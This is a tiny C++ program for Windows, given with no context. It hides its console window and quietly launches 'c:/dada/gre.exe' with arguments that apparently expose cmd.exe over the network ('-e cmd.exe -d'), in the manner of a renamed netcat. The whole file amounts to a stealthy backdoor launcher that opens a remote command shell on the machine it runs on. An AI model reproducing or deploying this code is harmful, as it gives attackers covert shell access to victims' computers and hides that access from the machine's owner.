#include <iostream>
#include <windows.h>
#include <string>
int main(int argc, char *argv[])
{
ShowWindow(GetConsoleWindow(), SW_HIDE);
system("START /MIN c:/dada/gre.exe 10 800 -e cmd.exe -d ^");
}